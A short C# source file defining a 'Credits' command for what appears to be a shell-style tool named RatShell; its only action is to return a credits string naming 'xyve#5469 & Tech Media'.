namespace RatMigration.RatShell.Commands
{
	public class Credits : Command
	{
		public Credits()
		{
			Description = "Returns the credits list.";
			Name = nameof(Credits);
		}

		public override string Invoke(string[] Args)
		{
			return "xyve#5469 & Tech Media";
		}
	}
}